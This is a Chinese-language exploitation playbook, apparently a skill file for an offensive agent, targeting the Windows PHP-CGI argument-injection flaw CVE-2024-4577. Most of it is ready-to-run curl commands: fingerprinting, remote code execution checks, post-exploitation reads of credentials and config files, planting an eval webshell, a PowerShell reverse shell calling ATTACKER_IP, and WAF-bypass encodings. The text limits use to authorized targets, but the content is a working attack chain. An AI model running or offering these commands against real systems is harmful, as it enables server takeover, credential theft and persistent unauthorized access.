---
name: 幻页·门廊
description: >-
  授权目标上 Windows PHP-CGI 参数注入 RCE（CVE-2024-4577）。HITCON 2026 反复出现。
  
  授权内全链：指纹→参数注入确认→RCE 验证→后渗透。
  广谱 1day 走 1day-nuclei-kit；情报走 hitcon-zeroday-intel。
---

# PHP-CGI CVE-2024-4577

**前提**：目标在 `授权范围`。

## 漏洞原理

Windows PHP-CGI 模式下，软连字符 `%AD`（U+00AD）被 Windows Best-Fit 映射为 `-`（0x2D），
绕过 PHP 对命令行参数 `-d` 的过滤，注入任意 `php.ini` 指令：
```
POST /php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
```
→ 注入 `allow_url_include=1` + `auto_prepend_file=php://input` → 请求体 PHP 代码直接执行 = **Pre-auth RCE**。

影响：PHP 8.3 < 8.3.8 / 8.2 < 8.2.20 / 8.1 < 8.1.29（Windows CGI/FCGI 模式），XAMPP 默认配置全中。

**成功口径**

| 档 | 成立 | 不算 |
|----|------|------|
| L1 | `X-Powered-By: PHP` 且 Server/体像 IIS/Windows，或 php-cgi 路径存在 | 仅 Linux `PHP/` |
| L2 | 授权内确认 CGI 吃软连字符参数（phpinfo 回显 / 无害命令回显） | — |
| L3 | 代码执行已验证（system/exec 回显 whoami/hostname） | — |

## 何时启用

- Windows / IIS + PHP，或用户点名 CVE-2024-4577
- HITCON 标题出现 `CVE-2024-4577`（ZD-2026-00944 同类）
- `nday_route` hit `php-cgi-4577`
- XAMPP 默认安装

## 利用矩阵

### L1 指纹探测

```bash
# 探测 Windows + PHP CGI
curl -sk -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0" "https://TARGET/"
# 看 Server: / X-Powered-By: PHP/
# 常见 CGI 路径
for p in /php-cgi/php-cgi.exe /cgi-bin/php-cgi.exe /php/php-cgi.exe /xampp/php-cgi.exe; do
  curl -sk -o /dev/null -w "%{http_code} $p\n" "https://TARGET$p"
done
```

### L2 参数注入确认（phpinfo）

```bash
# 软连字符注入 phpinfo — 无害验证
curl -sk -X POST "https://TARGET/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "<?php phpinfo(); ?>"
# 回显 phpinfo 页面 = 注入成功
```

### L3 RCE 验证

```bash
# 命令执行 — whoami 验证
curl -sk -X POST "https://TARGET/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "<?php system('whoami'); ?>"

# 主机名 + IP
curl -sk -X POST "https://TARGET/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "<?php system('whoami && hostname && ipconfig'); ?>"
```

### L3+ 后渗透（授权内直接做）

```bash
# 读文件
-d "<?php echo file_get_contents('C:\\Windows\\System32\\drivers\\etc\\hosts'); ?>"

# 列目录
-d "<?php system('dir C:\\'); ?>"

# 环境变量（翻凭据）
-d "<?php system('set'); ?>"

# 网络信息
-d "<?php system('ipconfig /all && netstat -an'); ?>"

# 进程列表
-d "<?php system('tasklist'); ?>"

# 数据库配置（XAMPP）
-d "<?php echo file_get_contents('C:\\xampp\\htdocs\\config.php'); ?>"
-d "<?php system('type C:\\xampp\\phpMyAdmin\\config.inc.php'); ?>"
```

### WebShell 落地（授权内可用）

```bash
# 一句话写入
-d "<?php file_put_contents('C:\\xampp\\htdocs\\se.php', '<?php @eval(\$_POST[\"se\"]); ?>'); echo 'OK'; ?>"

# 验证
curl -sk -X POST "https://TARGET/se.php" -d "se=system('whoami');"
```

### 反弹 Shell（授权内可用）

```bash
# PowerShell 反弹
-d "<?php system('powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient(\\\"ATTACKER_IP\\\",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\\\"PS \\\"+pwd+\\\"> \\\";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\"'); ?>"
```

## 同构变体

| 变体 | 路径 | 备注 |
|------|------|------|
| XAMPP 默认 | `/php-cgi/php-cgi.exe` | 最常见 |
| IIS + PHP CGI | `/cgi-bin/php-cgi.exe` | IIS Handler Mapping |
| 自定义路径 | `/php/php-cgi.exe` | 非标安装 |
| FCGI 模式 | 无直接 CGI 路径 | 需要特定配置才可利用 |
| 中文/日文/繁体 locale | 更多 Best-Fit 字符可用 | `%AD` 只是最稳定的一个 |

## 绕过 WAF

```bash
# 编码变体
%AD → %C0%AD（overlong UTF-8）
%AD → %E0%80%AD（3字节 overlong）

# 路径混淆
/php-cgi/php-cgi.exe → /PHP-CGI/PHP-CGI.EXE（Windows 不区分大小写）
/php-cgi/php-cgi.exe → /php-cgi/php-cgi.exe/..;/php-cgi/php-cgi.exe
```

## 最短命令

```bash
python3 炼蛊房/nday_route.py -u https://授权站 --case <案卷>
python3 炼蛊房/php_cgi_4577_probe.py --base https://授权站 --case <案卷>
```

## 真源

- `传承/门廊·开天.md`
- `tools/1day-kit/custom-templates/php-cgi-cve-2024-4577.yaml`
